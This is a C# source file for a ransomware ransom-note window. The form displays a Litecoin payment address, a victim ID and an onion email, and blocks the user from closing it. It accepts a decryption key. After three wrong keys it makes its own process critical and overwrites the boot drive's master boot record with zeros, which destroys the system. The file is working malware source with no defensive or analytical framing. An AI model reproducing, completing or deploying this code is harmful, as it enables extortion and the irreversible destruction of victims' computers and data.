using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Stub
{
    public partial class NYA : Form
    {
        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(
           string lpFileName,
           uint dwDesiredAccess,
           uint dwShareMode,
           IntPtr lpSecurityAttributes,
           uint dwCreationDisposition,
           uint dwFlagsAndAttributes,
           IntPtr hTemplateFile);


        [DllImport("kernel32")]
        private static extern bool WriteFile(
            IntPtr hFile,
            byte[] lpBuffer,
            uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped);

        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;

        private const uint OpenExisting = 0x3;


        private const uint FileFlagDeleteOnClose = 0x4000000;

        private const uint MbrSize = 512u;

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);


        public static int Tryes = 3;
        public NYA()
        {
            InitializeComponent();
        }

        private void NYA_FormClosed(object sender, FormClosedEventArgs e)
        {

        }

        private void NYA_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            System.Diagnostics.Process.Start("https://onionmail.org");
        }

        private void NYA_Load(object sender, EventArgs e)
        {
            LTC.Text = Config.LTCAddress;
            ID.Text = Program.ID;
            Email.Text = Config.OnionEmail;
            timer1.Start();
        }
    
    

        private void button3_Click(object sender, EventArgs e)
        {
            if(KEy.Text == Program.Key)
            {
                Encryption.OFF_Encrypt();
                MessageBox.Show("Thanks For ur Purchase we Will Decrpyt In 3 Secs", "OK!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            }
            else
            {
                
                Tryes--;
                MessageBox.Show($"Wrong Key! Remaining Tryes:{Tryes}", "WRONG!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if(Tryes == 0)
            {
                timer1.Stop();
                int isCritical = 1;
                int BreakOnTermination = 0x1D;

                Process.EnterDebugMode();

                NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
                var mbrData = new byte[MbrSize];

                var mbr = CreateFile(
                    "\\\\.\\PhysicalDrive0",
                    GenericAll,
                    FileShareRead | FileShareWrite,
                    IntPtr.Zero,
                    OpenExisting,
                    0,
                    IntPtr.Zero);

                    WriteFile(mbr,
                    mbrData,
                    MbrSize,
                    out uint lpNumberOfBytesWritten,
                    IntPtr.Zero);

                 Environment.Exit(0);
                  

            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(ID.Text);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(KEy.Text);
        }

        private void button4_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(LTC.Text);
        }
    }
}
